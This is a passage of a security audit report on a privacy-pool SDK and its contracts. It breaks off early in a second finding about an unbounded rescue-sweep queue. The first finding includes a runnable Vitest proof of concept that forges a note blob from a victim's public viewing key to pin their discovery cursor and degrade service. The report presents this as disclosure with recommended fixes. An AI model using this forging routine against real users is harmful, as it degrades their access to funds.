`NoteDiscoveryService.tryDecryptEvent` performs the ownership test by authenticated decryption: it derives the shared secret with `CryptoService.ecdh` from the viewing key and the event's ephemeral public key, decrypts with XChaCha20-Poly1305, decodes the payload and computes the commitment, returning `null` from a single `catch` if any step fails. Anonymous-discovery notes carry random hints, the indexed tag on the event that a targeted scan filters by, so the method's own comment calls the ECDH-then-decrypt path "the only correct rejection criterion". But the authentication tag proves only that the sender knew the recipient's viewing public key, which is not a secret. `KeystoreInteractor.getViewingKey` reads it for any address with a plain `readContract` against the `Keystore` contract's `viewingKeys` getter, behind nothing but an address-format check, and every registered user has a viewing key by construction.

`resolveCommitmentTimestamp` then refuses to persist a note whose commitment it cannot find in contract storage, retrying `DEFAULT_MAX_ATTEMPTS = 3` times with a 200 ms backoff that doubles to a 4× cap and returning `null` on a persistent miss. `createdAtBlock` is hashed into the timestamped state-tree leaf, so a sentinel would silently break later ragequit and transact proofs, the proofs that exit a note from the pool and that spend it.

`PoolSessionNoteDiscovery.earliestUnresolvedBlock` then holds the cursor at the earliest unresolved discovery, so a node lagging one block behind an event does not skip it. It is a plain reduce to the minimum `blockNumber` with no recency test of any kind, so it treats every `null` timestamp as transient lag. `NoteManager.setSyncCursor` applies no monotonicity check either: it is a bare assignment of the value it is handed, and `NoteManager.flush` writes it through `currentState` to the storage adapter, so the cursor can move backwards and the move survives a restart, since `loadFromStorage` reads it back. A monotonicity check or a recency bound inside either one would falsify this finding, and such a guard would have to sit in a caller above `discoverNotes`; there is none.

Anchoring a victim's cursor takes one deposit. The attacker reads the victim's viewing public key, builds a payload with arbitrary secret, value, token and label, encodes it as `NoteComputationService.encodeNotePayload` does, encrypts it to that key with a fresh ephemeral key, and submits a minimum deposit carrying the blob as note data. `Entrypoint.deposit` is `external payable` with no access modifier, gated only on `enabled` and `_value >= minAmount`, and the deploy-time asset registry sets `minAmount: 1` base unit on every row it configures. `PoolVault.deposit` re-emits the caller's bytes verbatim as `emit Note(_noteData.hint, _noteData.data)`; the interface NatSpec calls both fields "opaque to the contract", and the contract never relates `_noteData` to the deposit's own `outputCommitment`. `ENTRYPOINT_DEPOSIT_ABI` is re-exported from the SDK's public barrel, so building the call needs nothing private. The transact path carries an array of these blobs, capped only by the proof's context hash, and emits every element, so one spend can target many victims at once.

The victim's next discovery pass decrypts the blob, computes a commitment that is not in the vault and never will be, the attacker's deposit having committed to a different one, spends its retry budget resolving nothing, and sets the cursor to the attacker's block. That discovery is never added to the note manager: the loop pushes it to `unresolved` and `continue`s past the `addNote` block, so deduplication cannot recognise it on the next pass and `purgePhantomNotes` cannot remove it, since that purge reads `noteManager.getNotes()` and returns early on an empty list. Every subsequent pass repeats the sequence from the same block. The cursor moves only on a catch-all scan, the mode that trial-decrypts every note event rather than the events tagged for named contacts, and that mode is the default: an absent or empty contact array means "no contacts".

No note is lost: the loop persists every discovery that does resolve, on every pass, so a note delivered after the pin is found by the very next ordinary pass and the balance view stays correct. The only state a stale cursor writes is `NoteManager`'s `spentAtBlock` fallback, documented by the note-manager interface as metadata "never hashed into a witness". Funds cannot be stranded either: `PoolSessionRagequit.prepareRageQuit` gates on `NoteStatus.EXITED` and on an addressless note and on nothing else, takes no ASP client, no data provider, no discovery service and no sync cursor, and reads the note from the manager and the keystore leaves from chain. A status gate on that path, or any dependency of it on state that only a successful discovery pass refreshes, would falsify that bound, and `prepareRageQuit` has neither.

The recovery is a documented one-call override: `DiscoverNotesParams.fromBlock`, an exported public field that "overrides the NoteManager's sync cursor", which `PoolSession.discoverNotes` forwards through unchanged and the sample client's wrapper JSDoc tells integrators to pass to "rescan an earlier window". No shipped client path passes it in ordinary operation: every routine discovery call in the sample app, `refreshLocalAccount`, `loadActiveNote`, `waitForActiveNotes`, `computeASPRoot` and the deposit and withdrawal checks, calls `discoverNotes()` with no arguments. A routine call there that supplied a starting block would falsify that reading, and there is none; the only in-repo callers that supply `fromBlock` are recovery scripts and mainnet integration tests under `packages/swaps`. It clears the pin only when `fromBlock` is strictly greater than the poison block, since the pass re-derives the cursor from `unresolved` at its end, and it is one-shot: the attacker re-pins for another wei plus gas, and because the blob is unrelated to the deposit's own `outputCommitment` that deposit stays the attacker's own spendable note.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L288-L300
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L316-L323
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteManager.ts#L251-L267
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L224-L231
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteDiscoveryService.ts#L227-L253
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L176-L177
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L97-L134
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/ViemRPCInteractor.ts#L308-L350

#### Impact

For the price of one minimum deposit, a permissionless attacker imposes a permanently growing per-pass cost on a victim's note discovery, ending in a thrown pass that leaves every note the victim later receives unspendable through `transact`. Each poisoned payload burns the full `resolveCommitmentTimestamp` budget on every pass, three `eth_call`s and 600 ms of backoff sleep, scaling linearly in the number of blobs bought. The range `[poison block, head]` is re-scanned every pass and widens as the chain advances: the ASP leg re-downloads and re-trial-decrypts it at one X25519 ECDH plus one XChaCha20-Poly1305 open per `Note` event, and `ViemRPCInteractor.getLogsPaginated` walks it sequentially at `DEFAULT_LOGS_CHUNK_BLOCKS = 10_000`. Thirty days after one one-wei deposit:

| chain | block cadence | blocks in 30 days | `eth_getLogs` chunks per stream, per pass |
| --- | --- | --- | --- |
| Ethereum mainnet | ~12 s | 216,000 | 22 |
| Base | ~2 s | 1,296,000 | 130 |
| Arbitrum One | ~0.25 s | 10,368,000 | 1,037 |

The window is walked again for the `Transacted` and `Ragequit` streams whenever the ASP snapshot is unavailable, so Arbitrum One reaches roughly 3,100 round trips per pass at one month and 12,600 per stream at one year.

A 429 surviving one attempt plus `MAX_RATE_LIMIT_RETRIES = 3` is rethrown rather than bisected, because `fetchRangeWithShrink` bisects only on `isProviderLimitError`, which excludes the `HttpRequestError` that carries a 429. `discoverNotes` turns it into `NoteDiscoveryScanFailed` and throws at the `getNoteEvents` call, before `syncNotesStatus` and so before the only `PENDING` to `ACTIVE` promotion: a deposit persisted as `PENDING` by `PoolSessionDeposit` is never promoted, and `TransactOrchestrator` refuses it. The cursor did not advance, so the next pass fails the same way. Ragequit stays open, so what is lost is the ordinary spend path, not the assets.

#### Proof of concept

`CursorPin.poc.test.ts` drops into `packages/sdk/test/unit/` and runs from `packages/sdk` with `npx vitest run test/unit/CursorPin.poc.test.ts`; its four tests pass at this commit. It is a Vitest file that drives the unmodified SDK, the real `PoolSessionNoteDiscovery`, `NoteManager`, `NoteDiscoveryService`, `NoteComputationService`, `CryptoService` and `PoseidonHashService`. It forges the attacker's blob from nothing but the victim's public X25519 viewing key: a fresh ephemeral key, the shared secret from `CryptoService.ecdh`, the payload encoded by `NoteComputationService.encodeNotePayload`, encrypted with `CryptoService.encrypt` and tagged with the catch-all hint. No secret of the victim's is used. It imports `../../src/internal.js`, so it drops into a directory two levels below `packages/sdk`, such as `packages/sdk/test/services`, and runs with that package's `vitest run`. All four cases pass.

The first case is the pin. One forged blob at block `0x10` and one genuine note at block `0x20` whose commitment is present in the mocked commitment storage; the head is `0x30`. Pass one returns exactly one note, the genuine one, while the cursor lands on the attacker's block `0x10` and `resolveCommitmentTimestamp` has burned three `eth_call`s on a commitment that will never exist. That cursor is written through to the storage adapter, and a second `NoteManager` over the same adapter reads `0x10` back, so the pin survives a cold start. Passes two and three move the head to `0x2710` and then `0x186a0`: the fetched range is `[0x10, 0x2710]` and then `[0x10, 0x186a0]` while the cursor stays at `0x10`, and the commitment's `eth_call` count reaches six and then nine. `purgePhantomNotes` returns an empty list and leaves the cursor untouched, because the poisoned discovery was never stored as a note. A final `discoverNotes({ fromBlock: "0x11" })` moves the cursor to the head, and as the assertion's own comment notes, it is cleared only until the next poison blob.

The second case is the multiplier. It delivers five independent blobs in five separate blocks, `0x50` through `0x54`, each its own event with its own transaction hash. Across one pass the five commitments accumulate fifteen `eth_call`s and the cursor pins at `0x50`, the earliest of the five. It does not exercise a single transaction carrying an array of payloads, which is read from the transact path rather than driven here.

The third case shows the cursor moving strictly backwards: a note manager already synced to `0x4000` is handed one unresolvable row carrying `blockNumber` `0x0`, and the cursor is reassigned to `0x0`. That row is served by the mocked ASP note-events fetch, not by a deposit, so what the case establishes is the absence of any monotonicity guard in `setSyncCursor`, not that a deposit can rewind a cursor below its current value.

The fourth case traces how far the failure reaches. The event fetch is made to reject with a rate-limit error, `discoverNotes` throws `NoteDiscoveryScanFailed`, and a note held at `PENDING` is still `PENDING` afterwards, because the pass died before the promotion step.

Only the outside edges are mocked: `IPoolVaultInteractor`, `IRPCInteractor`, `IASPDataProvider`, `IASPClient`, `IPaymentRequestService`, `IKeystoreManager` and the note storage adapter. Three limitations follow. The deposit is never executed on chain, the forged blob being handed to discovery as a `Note` event, so the claim that `Entrypoint.deposit` and `PoolVault.deposit` accept and re-emit arbitrary `_noteData` bytes for one wei is read from the contracts rather than demonstrated here. The rate-limit failure of the fourth case is injected directly at the event fetch, so `ViemRPCInteractor`'s pagination, its three linear-backoff retries and its refusal to bisect the error class that carries a 429 are read from source; no figure in the table above was measured, and the chunk counts there are arithmetic over the chunk size and each chain's block cadence. And the harness stops at the `PENDING` note: the `TransactOrchestrator` gate that then refuses a non-`ACTIVE` note, and the ragequit path that stays open regardless, are both read from source and not driven by this file.

What is measured is the cursor value after each pass, its persistence across a reload, the `eth_call` count per commitment per pass, the block range requested on each pass, the emptiness of the purge, and the note status after a thrown pass.

```ts
/**
 * Audit proof of concept: one forged NoteData blob encrypted to a victim's
 * PUBLIC viewing key pins the victim's discovery sync cursor; every later pass re-scans a
 * growing range and re-pins. Real CryptoService / Poseidon / NoteDiscoveryService / NoteManager;
 * only the chain, RPC and ASP edges are mocked.
 *
 * Untracked file — copied in for the run and removed afterwards.
 */
import { bytesToHex, hexToBytes } from "@noble/ciphers/utils.js";
import { x25519 } from "@noble/curves/ed25519.js";
import { beforeAll, describe, expect, it } from "vitest";

import type {
    Address,
    Hash,
    Hex,
    IASPClient,
    IASPDataProvider,
    IKeystoreManager,
    INoteStorageAdapter,
    IPaymentRequestService,
    IPoolVaultInteractor,
    IRPCInteractor,
    LabelStatus,
    Note,
    NoteEvent,
    NoteManagerState,
    NotePayload,
    PublicKey,
    Secret,
} from "../../src/internal.js";
import {
    CATCH_ALL_TAG,
    CryptoService,
    NoteComputationService,
    NoteDiscoveryScanFailed,
    NoteDiscoveryService,
    NoteManager,
    NoteStatus,
    PoolSessionNoteDiscovery,
    PoseidonHashService,
} from "../../src/internal.js";

const TOKEN = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" as Address;
const VICTIM = "0x742d35cc6634c0532925a3b844bc9e7fe0c0f392" as Address;
const REAL_TS = "0x68000000" as Hash;

function hex32(n: number): Hash {
    return `0x${n.toString(16).padStart(64, "0")}` as Hash;
}

/** Exactly what an attacker does with only the victim's public X25519 viewing key. */
function forgeNoteEvent(
    crypto: CryptoService,
    codec: NoteComputationService,
    victimViewingPub: PublicKey,
    payload: NotePayload,
    blockNumber: Hex,
    txHash: Hash,
): NoteEvent {
    const ephPriv = crypto.generateSecret();
    const ephPub = `0x${bytesToHex(x25519.getPublicKey(hexToBytes(ephPriv.slice(2))))}` as PublicKey;
    const shared = crypto.ecdh(ephPriv, victimViewingPub);
    const encryptedPayload = crypto.encrypt(codec.encodeNotePayload(payload), shared);
    return { blockNumber, txHash, hint: CATCH_ALL_TAG, ephemeralPubKey: ephPub, encryptedPayload };
}

class MemoryAdapter implements INoteStorageAdapter {
    state: NoteManagerState | null = null;
    saves = 0;
    async saveState(s: NoteManagerState): Promise<void> {
        this.state = JSON.parse(JSON.stringify(s));
        this.saves++;
    }
    async getState(): Promise<NoteManagerState | null> {
        return this.state;
    }
    async clearState(): Promise<void> {
        this.state = null;
    }
}

/** Chain edge: Note events by block, commitment storage, and call accounting. */
class ChainMock {
    events: NoteEvent[] = [];
    onChain = new Set<string>();
    timestampCalls = new Map<string, number>();
    noteEventRanges: [bigint, bigint][] = [];
    fail = false;

    vault(): IPoolVaultInteractor {
        return {
            getAddress: () => "0x0000000000000000000000000000000000000000" as Address,
            getCommitmentTimestamp: (c: Hash) => {
                this.timestampCalls.set(c, (this.timestampCalls.get(c) ?? 0) + 1);
                return Promise.resolve(this.onChain.has(c.toLowerCase()) ? REAL_TS : ("0x0" as Hash));
            },
            getNullifierTimestamp: () => Promise.resolve("0x0" as Hash),
            isKnownRoot: () => Promise.resolve(false),
            getStateLeaves: () => Promise.resolve([]),
            exportLeafCache: () => undefined,
            getNoteEvents: (from: Hex, to: Hex) => {
                if (this.fail) return Promise.reject(new Error("HTTP 429 rate limit exhausted"));
                this.noteEventRanges.push([BigInt(from), BigInt(to)]);
                return Promise.resolve(
                    this.events.filter(
                        (e) => BigInt(e.blockNumber) >= BigInt(from) && BigInt(e.blockNumber) <= BigInt(to),
                    ),
                );
            },
            getTransactedEvents: () => Promise.resolve([]),
            extractSpentNullifiers: () => [],
            getDepositedEvents: () => Promise.resolve([]),
            getRagequitEvents: () => Promise.resolve([]),
            submitTransaction: () => Promise.resolve("0x0" as Hex),
            encodeRagequit: () => ({ to: VICTIM, data: "0x" as Hex, value: "0x0" as Hex }),
            encodeTransact: () => ({ to: VICTIM, data: "0x" as Hex, value: "0x0" as Hex }),
        } as unknown as IPoolVaultInteractor;
    }
}

function rpc(head: { value: Hex }): IRPCInteractor {
    return {
        readContract: () => Promise.resolve(null),
        getBlockNumber: () => Promise.resolve(head.value),
        waitForTransactionReceipt: () =>
            Promise.resolve({ txHash: "0x0" as Hex, status: true, blockNumber: "0x0" as Hex, logs: [] }),
        getLogs: () => Promise.resolve([]),
        getLogsPaginated: () => Promise.resolve([]),
    } as unknown as IRPCInteractor;
}

/** ASP that serves NO note events (throws → RPC fallback), snapshot covers nothing. */
function aspProvider(opts: { noteEventsRows?: NoteEvent[] } = {}): IASPDataProvider {
    return {
        getRoot: () => Promise.resolve("0x0" as Hash),
        getLeaves: () => Promise.resolve([]),
        getLabelStatus: () => Promise.resolve({ status: "approved" } as LabelStatus),
        getASPPublicKey: () => Promise.resolve(("0x" + "00".repeat(32)) as PublicKey),
        getEventSnapshot: () =>
            Promise.resolve({
                chainId: "0x1" as Hex,
                snapshotBlockNumber: "0x0" as Hex,
                generatedAt: "1970-01-01T00:00:00.000Z",
                deposits: [],
                transacts: [],
                ragequits: [],
                leaves: [],
                keystoreLeaves: [],
            }),
        getNoteEvents: () =>
            opts.noteEventsRows
                ? Promise.resolve({ events: opts.noteEventsRows, lastSyncedBlock: "0xffffffff" as Hex })
                : Promise.reject(new Error("ASP unavailable")),
    } as unknown as IASPDataProvider;
}

function aspClient(): IASPClient {
    return {
        getAssociationSetRoot: () => Promise.resolve("0x0" as Hash),
        getAssociationSetLeaves: () => Promise.resolve([]),
        getMerkleProof: () => Promise.reject(new Error("not used")),
        getLabelStatus: () => Promise.resolve({ status: "approved" } as LabelStatus),
        getASPPublicKey: () => Promise.resolve(("0x" + "00".repeat(32)) as PublicKey),
    } as unknown as IASPClient;
}

function paymentRequests(): IPaymentRequestService {
    return {
        generate: () => Promise.reject(new Error("unused")),
        list: () => Promise.resolve([]),
        getOpenRequests: () => Promise.resolve([]),
        getScannableRequests: () => Promise.resolve([]),
        markFulfilled: () => Promise.resolve(),
        archive: () => Promise.resolve(),
        clear: () => Promise.resolve(),
        loadFromStorage: () => Promise.resolve(),
        exportState: () => [],
        importState: () => Promise.resolve(),
    } as unknown as IPaymentRequestService;
}

function keystore(priv: Secret, pub: PublicKey): IKeystoreManager {
    return {
        getPrivateNullifyingKey: () => priv,
        getPrivateRevocableKey: () => priv,
        getViewingKeyPair: () => ({ privateKey: priv, publicKey: pub }),
        applyRotation: () => {},
        getRevocableKeyIndex: () => "0x0" as Hex,
        isRegistered: () => false,
        markRegistered: () => {},
    } as unknown as IKeystoreManager;
}

describe("Forged NoteData blob pins the discovery cursor", () => {
    let crypto: CryptoService;
    let codec: NoteComputationService;
    let discovery: NoteDiscoveryService;
    let victimPriv: Secret;
    let victimPub: PublicKey;

    beforeAll(async () => {
        crypto = new CryptoService();
        const hashService = await PoseidonHashService.create();
        codec = new NoteComputationService({ hashService, cryptoService: crypto });
        discovery = new NoteDiscoveryService({ cryptoService: crypto, hashService, noteComputationService: codec });
        victimPriv = crypto.generateSecret();
        victimPub = `0x${bytesToHex(x25519.getPublicKey(hexToBytes(victimPriv.slice(2))))}` as PublicKey;
    });

    function commitmentOf(payload: NotePayload): Hash {
        const nah = codec.computeNoteAddressHash(VICTIM, payload.noteSecret);
        return codec.computeFullCommitment({
            noteAddressHash: nah,
            tokenId: payload.tokenId,
            value: payload.value,
            label: payload.label,
        }) as Hash;
    }

    it("pins the cursor at the attacker's block, survives flush/reload, re-scans a growing range, and purge cannot clear it", async () => {
        const chain = new ChainMock();
        const head = { value: "0x30" as Hex };
        const adapter = new MemoryAdapter();
        const noteManager = new NoteManager({}, { storageAdapter: adapter });

        // Attacker: knows ONLY victimPub (Keystore.viewingKeys(victim) — public view). Random secret;
        // the commitment this decrypts to is never inserted into PoolVault.commitments.
        const poison: NotePayload = {
            noteSecret: crypto.generateSecret(),
            value: "0x1" as Hex,
            tokenId: TOKEN,
            label: hex32(0xbad) as `0x${string}`,
        };
        const poisonCommitment = commitmentOf(poison);
        chain.events.push(forgeNoteEvent(crypto, codec, victimPub, poison, "0x10" as Hex, hex32(1)));

        // A genuine note to the victim at a later block (its commitment IS on chain).
        const genuine: NotePayload = {
            noteSecret: hex32(7) as Secret,
            value: "0x3e8" as Hex,
            tokenId: TOKEN,
            label: hex32(0x600d) as `0x${string}`,
        };
        chain.onChain.add(commitmentOf(genuine).toLowerCase());
        chain.events.push(forgeNoteEvent(crypto, codec, victimPub, genuine, "0x20" as Hex, hex32(2)));

        const session = new PoolSessionNoteDiscovery({
            ownerAddress: VICTIM,
            noteDiscoveryService: discovery,
            noteManager,
            keystoreManager: keystore(victimPriv, victimPub),
            poolVaultInteractor: chain.vault(),
            rpcInteractor: rpc(head),
            noteComputationService: codec,
            aspDataProvider: aspProvider(),
            aspClient: aspClient(),
            paymentRequestService: paymentRequests(),
        });

        // ── Pass 1 ──
        const found1 = await session.discoverNotes();
        expect(found1).toHaveLength(1); // the genuine note IS still discovered
        expect(noteManager.getSyncCursor()).toBe("0x10"); // …but the cursor is pinned at the poison block, not 0x30
        expect(chain.timestampCalls.get(poisonCommitment)).toBe(3); // DEFAULT_MAX_ATTEMPTS eth_calls burned
        expect(adapter.state?.syncCursor).toBe("0x10"); // persisted by flush()

        // ── Pass 2, head far ahead ──
        head.value = "0x2710"; // 10 000
        const found2 = await session.discoverNotes();
        expect(found2).toHaveLength(0); // dedup: genuine note not re-added
        expect(chain.noteEventRanges.at(-1)).toEqual([0x10n, 0x2710n]); // re-scanned from the pin, not from 0x30
        expect(noteManager.getSyncCursor()).toBe("0x10"); // re-pinned
        expect(chain.timestampCalls.get(poisonCommitment)).toBe(6); // 3 more eth_calls, ~600 ms more wall time

        // ── Pass 3, head further ahead: the range keeps growing ──
        head.value = "0x186a0"; // 100 000
        await session.discoverNotes();
        expect(chain.noteEventRanges.at(-1)).toEqual([0x10n, 0x186a0n]);
        expect(noteManager.getSyncCursor()).toBe("0x10");
        expect(chain.timestampCalls.get(poisonCommitment)).toBe(9);

        // ── The pin survives a cold start (loadFromStorage) ──
        const reloaded = new NoteManager({}, { storageAdapter: adapter });
        await reloaded.loadFromStorage();
        expect(reloaded.getSyncCursor()).toBe("0x10");

        // ── purgePhantomNotes cannot help: the poison was never stored ──
        const purged = await session.purgePhantomNotes();
        expect(purged).toEqual([]);
        expect(noteManager.getNotes()).toHaveLength(1);
        expect(noteManager.getSyncCursor()).toBe("0x10");

        // ── The only escape is a caller-supplied fromBlock past the poison block ──
        head.value = "0x186a1";
        await session.discoverNotes({ fromBlock: "0x11" as Hex });
        expect(noteManager.getSyncCursor()).toBe("0x186a1"); // cleared — until the next poison blob
    });

    it("N independent poison blobs multiply the per-pass eth_call cost and pin at the earliest", async () => {
        const chain = new ChainMock();
        const head = { value: "0x1000" as Hex };
        const noteManager = new NoteManager({});
        const n = 5;
        const commitments: Hash[] = [];
        for (let i = 0; i < n; i++) {
            const p: NotePayload = {
                noteSecret: crypto.generateSecret(),
                value: "0x1" as Hex,
                tokenId: TOKEN,
                label: hex32(0x100 + i) as `0x${string}`,
            };
            commitments.push(commitmentOf(p));
            chain.events.push(forgeNoteEvent(crypto, codec, victimPub, p, `0x${(0x50 + i).toString(16)}` as Hex, hex32(10 + i)));
        }
        const session = new PoolSessionNoteDiscovery({
            ownerAddress: VICTIM,
            noteDiscoveryService: discovery,
            noteManager,
            keystoreManager: keystore(victimPriv, victimPub),
            poolVaultInteractor: chain.vault(),
            rpcInteractor: rpc(head),
            noteComputationService: codec,
            aspDataProvider: aspProvider(),
            aspClient: aspClient(),
            paymentRequestService: paymentRequests(),
        });
        await session.discoverNotes();
        expect(noteManager.getSyncCursor()).toBe("0x50");
        const total = commitments.reduce((s, c) => s + (chain.timestampCalls.get(c) ?? 0), 0);
        expect(total).toBe(3 * n);
    });

    it("An ASP row with blockNumber 0 rewinds the cursor to genesis with no transaction", async () => {
        const chain = new ChainMock();
        const head = { value: "0x5000" as Hex };
        const noteManager = new NoteManager({});
        noteManager.setSyncCursor("0x4000" as Hex); // victim already synced far ahead
        const p: NotePayload = {
            noteSecret: crypto.generateSecret(),
            value: "0x1" as Hex,
            tokenId: TOKEN,
            label: hex32(0x200) as `0x${string}`,
        };
        const row = forgeNoteEvent(crypto, codec, victimPub, p, "0x0" as Hex, hex32(20));
        const session = new PoolSessionNoteDiscovery({
            ownerAddress: VICTIM,
            noteDiscoveryService: discovery,
            noteManager,
            keystoreManager: keystore(victimPriv, victimPub),
            poolVaultInteractor: chain.vault(),
            rpcInteractor: rpc(head),
            noteComputationService: codec,
            aspDataProvider: aspProvider({ noteEventsRows: [row] }),
            aspClient: aspClient(),
            paymentRequestService: paymentRequests(),
        });
        await session.discoverNotes();
        expect(noteManager.getSyncCursor()).toBe("0x0"); // rewound below the previous cursor: no monotonicity guard
    });

    it("when a pass throws, PENDING→ACTIVE promotion never runs, so a fresh deposit stays unspendable via transact", async () => {
        const chain = new ChainMock();
        chain.fail = true; // e.g. getLogsPaginated after MAX_RATE_LIMIT_RETRIES 429s
        const head = { value: "0x1000" as Hex };
        const noteManager = new NoteManager({});
        const pending: Note = {
            noteAddressHash: hex32(1),
            commitment: hex32(2),
            value: "0x64" as Hex,
            tokenId: TOKEN,
            label: hex32(3),
            status: NoteStatus.PENDING,
            ownerAddress: VICTIM,
            noteSecret: hex32(4) as Secret,
            isOwned: true,
            createdAtBlock: REAL_TS,
            spentAtBlock: null,
            txHash: hex32(5),
        };
        noteManager.addNote(pending);
        const session = new PoolSessionNoteDiscovery({
            ownerAddress: VICTIM,
            noteDiscoveryService: discovery,
            noteManager,
            keystoreManager: keystore(victimPriv, victimPub),
            poolVaultInteractor: chain.vault(),
            rpcInteractor: rpc(head),
            noteComputationService: codec,
            aspDataProvider: aspProvider(),
            aspClient: aspClient(),
            paymentRequestService: paymentRequests(),
        });
        await expect(session.discoverNotes()).rejects.toBeInstanceOf(NoteDiscoveryScanFailed);
        expect(noteManager.getNote(hex32(2)).status).toBe(NoteStatus.PENDING);
    });
});
```

#### Recommendation

We recommend making the cursor monotonic and bounding the unresolved hold by recency: `setSyncCursor` should refuse to move the cursor backwards, and `earliestUnresolvedBlock` should hold the cursor only for discoveries within a small number of blocks of the head it is given as its fallback, letting an older unresolvable discovery be recorded and skipped instead of blocking progress; lag and reorg are the cases that branch's comment names. We also recommend counting resolution failures per commitment so a payload that has already exhausted its budget is not re-attempted on every later pass, and separating note-status reconciliation from the event fetch, since promoting notes the session already holds does not depend on the fetch succeeding and a rate-limit failure on one chunk currently discards the whole pass along with the promotion.

We also recommend surfacing this condition through the interface and documenting the recovery against it. A discovery that decrypts but resolves to no commitment is reported in exactly one reachable place, `discoverNotes`'s own `logger?.warn("Commitments without an on-chain timestamp; retrying next scan", …)`, which an integrator sees only with a logger configured on the discovery session; the second warning for the same condition, `resolveCommitmentTimestamp`'s "Could not resolve commitment timestamp after retries", cannot fire on this path at all, because the discovery loop calls that helper with two arguments and never supplies the `logger` option. The recovery, a `discoverNotes` call whose `fromBlock` is strictly greater than the block the payload arrived in, should be documented against this failure mode rather than only as a way to rescan an earlier window.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #010 — The rescue sweep's work list is caller-extensible, ordered worst-first, and bounded by nothing

**Severity:** Medium · **Location:** `packages/relayer/dust-rescue-service/src/sweep/sweep.service.ts` · **Bug:** Medium · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-01 (3 findings) · **Kill chain:** KC-03 · **Status:** Open

#### Description

A cross-chain reshield moves a user's position out of the pool on one chain, bridges the money through LiFi, an external bridging service, and redeposits it on another. The user does not broadcast any of that: they hand the work to the relayer, which submits it for them and charges a fee. A swap never lands exactly on its target, so a residue is left stranded every time, and a background service exists to sweep those residues back in. One rescue is one job in a Firestore collection; a scheduler calls the service every five minutes, and the service loads every job that has not reached a terminal state and advances them one at a time, all inside that one request.

A stranded residue is not something the user can go and collect. It sits at an address the operator controls, and the sweep is the design's answer to it: the service detects the residue, builds a deposit proof for it, and submits that deposit so the money re-enters the pool as the user's. A job the sweep does not reach on one pass is not lost, only deferred to the next one, which is a safe answer for exactly as long as every job is eventually reached.

**Where it breaks.** Nothing bounds the list at either end, and the two ends are priced against each other backwards:

- filling it costs one relay request. A single optional flag creates a job, no check asks whether the relay it rides on is a cross-chain reshield or will strand a residue anywhere, no bridge fee is forced, and the principal comes back to the caller at a destination of their choosing, so the same capital funds relay after relay.
- draining it is one serial pass, which cannot be parallelised because every rescue signs with one shared key. The deployment the shipped workflow and README produce gives that pass 300 seconds and starts a new one every 300 seconds, so there is no headroom at all and a deficit never recovers.

A pass that overruns is killed mid-loop, and what it fails to reach is not a random slice. The query asks for no ordering, so the rows come back ordered by the field they were filtered on, which is the job's state, and the non-terminal states sort so that every job still waiting for a residue to arrive precedes every job that has already found one. A job whose transfer the bridge never recognises is charged no failed attempt, so it never retires, and it waits at the head of that order indefinitely.

The rescues starved are therefore always the same ones, the ones furthest along, each holding real dust already detected with a proof built or a deposit in flight, and the money they exist to return stays at the operator-controlled address where it was stranded.

The dust-rescue sweep runs as a single scheduled request. `SweepService.run` loads every non-terminal job through the job store's `listNonTerminal` and advances them one at a time in a plain sequential `for`. `listNonTerminal` is one Firestore query, the jobs collection filtered on `state` not-in `TERMINAL_STATES`, with no `orderBy`, no `limit` and no lease. An `orderBy` or `limit` on that query, or a server-side cap on the jobs collection, would make a pass finite, and the tree contains none of them.

The serial loop is deliberate and cannot be widened. `SweepService`'s own class comment states that jobs are processed sequentially and never through `Promise.all`, because every rescue signs with the one signer key shared across every destination chain, so parallelising would race nonces globally rather than per-address; `ChainWriteService.send` builds a wallet client from that single `signerPrivateKey` and fetches a fresh pending nonce immediately before each write. The only lever over sweep cost is therefore the size of the work list.

The sweep's budget equals its own period, so there is no headroom by construction. The documented Cloud Scheduler job in the service README fires `POST /sweep` on `*/5 * * * *`, one pass every 300 seconds, and `SweepController`'s docstring names the same interval. The shipped deploy workflow's `gcloud run deploy` step passes `--image`, `--region`, `--no-allow-unauthenticated`, `--set-secrets` and `--update-env-vars`, and no `--timeout`, so the request inherits Cloud Run's default request timeout of 300 seconds. Budget 300 s against period 300 s leaves no headroom at saturation: the first pass that needs more than 300 seconds is killed as the next tick fires, and the deficit never recovers. The service is documented as built and unit-tested but not yet deployed, so these figures describe the deployment the shipped workflow and README produce; an explicit `--timeout` larger than the scheduler period would restore the headroom recorded here as zero, without bounding the queue.

Each job in that list costs the sweep real time inside that budget: a job awaiting a destination costs at least one outbound HTTPS status call in `DetectionService.check`, and a second when it carries a `dust1ForwardTxHash`, the hash of the transaction that forwarded a second residue to the destination from the source chain; a completed leg costs a receipt read through a freshly constructed public client; a job in the proving state costs a fetch from the Association Set Provider, the off-chain service that supplies the protocol's compliance data, plus chain reads and an in-process Groth16 proof over the deposit circuit, all in the same request. Per-job wall-clock is the one quantity recorded nowhere in the repository, so what follows is a sensitivity rather than a measurement: at a quarter-second per status round trip a 300-second pass holds roughly 1,200 status-only jobs, at one second roughly 300, and a single proving job consumes a visible fraction of the budget on its own.

